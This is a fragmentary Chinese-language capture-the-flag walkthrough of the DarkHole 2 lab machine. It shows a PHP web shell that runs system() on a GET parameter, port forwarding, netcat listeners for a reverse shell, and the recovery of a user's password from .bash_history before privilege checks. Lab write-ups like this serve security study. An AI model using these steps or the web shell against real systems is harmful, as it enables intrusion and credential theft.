2.代码审计

直接访问80端口，是一个登陆界面，找不到有效的用户名与密码。

$connect = new mysqli("localhost","root","","darkhole_2");

查看index.php文件，找到关键部分，存在URL /dashboard.php?id= 。

查看login.php文件，找到关键部分，登录校验用户email、password和id=1，这里写死了id=1，应该是只允许一个用户登陆80的意思(?)。
┌──(root㉿kali)-[~/Tools/test/192.168.81.131]

session_start();

   $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
   $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));

可以看到losy定时在目录/opt/web下执行任务，监听本地端口9999。
进到/opt/web下，看一下php文件：通过GET，传输参数cmd，执行系统命令。
jehad@darkhole:/opt/web$ cat index.php 
<?php
echo "Parameter GET['cmd']";
if(isset($_GET['cmd'])){
echo system($_GET['cmd']);
}
?>

直接访问http://192.168.81.131:9999/，访问不了。
进行端口转发，对本机7777端口的访问映射到靶机的9999端口上(注意:是在攻击机上进行)：

可以通过losy执行系统命令，想办法反弹shell。

└─# nc -lnvp 6666

┌──(root㉿kali)-[~]
└─# nc -lnvp 6666

成功拿到losy的shell，看了一下还是得提到root，发现sudo不了，只拿到了shell外壳，没有校验口令：
losy@darkhole:/home$ sudo -l
sudo -l

去看看losy的.bash_history，找到losy的密码gang：
losy@darkhole:~$ cat .bash_history

再到jehad那边切换到losy，再sudo -l：
losy@darkhole:~$ sudo -l
